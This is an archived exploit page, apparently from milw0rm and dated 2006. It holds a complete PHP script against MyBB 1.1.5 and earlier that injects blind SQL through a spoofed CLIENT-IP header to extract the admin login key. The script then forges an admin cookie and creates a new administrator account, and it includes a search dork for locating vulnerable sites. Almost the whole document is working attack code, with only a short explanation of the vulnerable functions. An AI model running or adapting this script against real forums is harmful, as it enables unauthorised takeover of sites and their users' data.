<html><head><title>MyBulletinBoard (MyBB) <= 1.1.5 (CLIENT-IP) SQL Injection Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;MyBulletinBoard (MyBB) &lt;= 1.1.5 'CLIENT-IP' SQL injection / create new admin exploit\n&quot;;
echo &quot;by rgod rgod@autistici.org\n&quot;;
echo &quot;site: http://retrogod.altervista.org\n&quot;;
echo &quot;dork, version specific: \&quot;Powered By MyBB\&quot; \&quot;2006 MyBB Group\&quot;\n\n&quot;;
/*
works regardless of php.ini settings
*/
if ($argc&lt;3) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path OPTIONS\n&quot;;
echo &quot;host:      target server (ip/hostname)\n&quot;;
echo &quot;path:      path to MyBB\n&quot;;
echo &quot;Options:\n&quot;;
echo &quot;   -T[prefix]   specify a table prefix different from default (mybb_)\n&quot;;
echo &quot;   -u[number]   specify a user id other than 1 (usually admin)\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\n&quot;;
echo &quot;   -d:          disclose table prefix (reccomended)\n&quot;;
echo &quot;Example:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /MyBB/ -d\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /MyBB/ -Tmy_\r\n&quot;;
die;
}
/* software site: http://www.mybboard.com/

   vulnerable code in inc/functions.php near lines 1292-1320:

   ...
   function getip() {
	global $_SERVER;
	if($_SERVER['HTTP_X_FORWARDED_FOR'])
	{
		if(preg_match_all(&quot;#[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#s&quot;, $_SERVER['HTTP_X_FORWARDED_FOR'], $addresses))
		{
			while(list($key, $val) = each($addresses[0]))
			{
				if(!preg_match(&quot;#^(10|172\.16|192\.168)\.#&quot;, $val))
				{
					$ip = $val;
					break;
				}
			}
		}
	}
	if(!$ip)
	{
		if($_SERVER['HTTP_CLIENT_IP'])
		{
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		}
		else
		{
			$ip = $_SERVER['REMOTE_ADDR'];
		}
	}
	return $ip;
}
...

you can spoof your ip address through the CLIENT-IP http header...
as result you can inject sql statements in class_session.php at lines 36-68:
by calling the main index.php script
...
function init()
	{
		global $ipaddress, $db, $mybb, $noonline;
		//
		// Get our visitors IP
		//
		$this-&gt;ipaddress = $ipaddress = getip();

		//
		// User-agent
		//
		$this-&gt;useragent = $_SERVER['HTTP_USER_AGENT'];
		if(strlen($this-&gt;useragent) &gt; 100)
		{
			$this-&gt;useragent = substr($this-&gt;useragent, 0, 100);
		}

		//
		// Attempt to find a session id in the cookies
		//
		if($_COOKIE['sid'])
		{
			$this-&gt;sid = addslashes($_COOKIE['sid']);
		}
		else
		{
			$this-&gt;sid = 0;
		}

		//
		// Attempt to load the session from the database
		//
		$query = $db-&gt;query(&quot;SELECT sid,uid FROM &quot;.TABLE_PREFIX.&quot;sessions WHERE sid='&quot;.$this-&gt;sid.&quot;' AND ip='&quot;.$this-&gt;ipaddress.&quot;'&quot;);
...

injection is blind, but you can ask true-false questions to the database to
retrieve the admin loginkey.
Through that you can build an admin cookie and create a new admin user through
the admin/users.php script.
Also you can disclose table prefix.

--------------------------------------------------------------------------------


-*****************************************************************************-
*                                                                            *
* Italia - Germania 2-0, al 114' forse il più bel gol che abbia mai visto    *
* grazie Grosso!                                                             *
*                                                                            *
-*****************************************************************************-
 */

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
   $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
   }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}
srand(make_seed());
$anumber = rand(1,99999);

$host=$argv[1];
$path=$argv[2];
$port=80;
$prefix=&quot;mybb_&quot;;
$user_id=&quot;1&quot;;//admin
$proxy=&quot;&quot;;
$dt=0;
for ($i=3; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-T&quot;)
{
  $prefix=str_replace(&quot;-T&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-u&quot;)
{
  $user_id=str_replace(&quot;-u&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-d&quot;)
{
  $dt=1;
}
}
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

if ($dt)
{
$sql=&quot;'suntzuuuu/*&quot;;
echo &quot;sql -&gt; &quot;.$sql.&quot;\r\n&quot;;
$packet =&quot;GET &quot;.$p.&quot;index.php HTTP/1.0\r\n&quot;;
$packet.=&quot;CLIENT-IP: $sql\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (eregi(&quot;You have an error in your SQL syntax&quot;,$html))
{
 $temp=explode(&quot;sessions&quot;,$html);
 $temp2=explode(&quot; &quot;,$temp[0]);
 $prefix=$temp2[count($temp2)-1];
 echo &quot;prefix -&gt; &quot;.$prefix;if ($prefix==&quot;&quot;){echo &quot;[no prefix]&quot;;}echo&quot;\n&quot;;
}
else
{
echo &quot;unable to disclose table prefix...\n&quot;;
}
sleep(1);
}

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(65,90));//A-Z letters
$chars=array_merge($chars,range(97,122));//a-f letters
$j=1;
$loginkey=&quot;&quot;;
while (!strstr($loginkey,chr(0)))
{
for ($i=0; $i&lt;=255; $i++)
{
if (in_array($i,$chars))
{
$sql=&quot;99999999' UNION SELECT ASCII(SUBSTRING(loginkey,&quot;.$j.&quot;,1))=&quot;.$i.&quot;,0 FROM &quot;.$prefix.&quot;users WHERE uid=1/*&quot;;
echo &quot;sql -&gt; &quot;.$sql.&quot;\r\n&quot;;
$packet =&quot;GET &quot;.$p.&quot;index.php HTTP/1.0\r\n&quot;;
$packet.=&quot;CLIENT-IP: $sql\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (eregi(&quot;Hello There&quot;,$html)) {$loginkey.=chr($i);echo &quot;loginkey -&gt; &quot;.$loginkey.&quot;[???]\r\n&quot;;sleep(1);break;}
}
if ($i==255) {die(&quot;Exploit failed...&quot;);}
}
  $j++;
}
$cookie=&quot;mybbuser=1_&quot;.trim(str_replace(chr(0),&quot;&quot;,$loginkey)).&quot;; mybbadmin=1_&quot;.trim(str_replace(chr(0),&quot;&quot;,$loginkey)).&quot;;&quot;;
echo &quot;admin cookie -&gt; &quot;.$cookie.&quot;\r\n&quot;;


$data='-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;action&quot;;

do_add
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;userusername&quot;;

suntzu'.$anumber.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;newpassword&quot;;

suntzu'.$anumber.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;email&quot;;

suntzoi@suntzu.org
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;usergroup&quot;;

4
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;additionalgroups[]&quot;;

4
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;displaygroup&quot;;

4
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;Add User&quot;;

  Add User
-----------------------------7d62702f250530--
';

$packet=&quot;POST &quot;.$p.&quot;admin/users.php HTTP/1.0\r\n&quot;;
$packet.=&quot;User-Agent: Googlebot/2.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
if (eregi(&quot;The user has successfully been added&quot;,$html))
{
  echo &quot;exploit succeeded... now login as admin\n&quot;;
  echo &quot;with username \&quot;suntzu&quot;.$anumber.&quot;\&quot; and password \&quot;suntzu&quot;.$anumber.&quot;\&quot;\n&quot;;
}
else
{
  echo &quot;something goes wrong...\n&quot;;if(!$dt)echo &quot;you may try -d option\n&quot;;
}
?&gt;

# milw0rm.com [2006-07-15]</pre></html>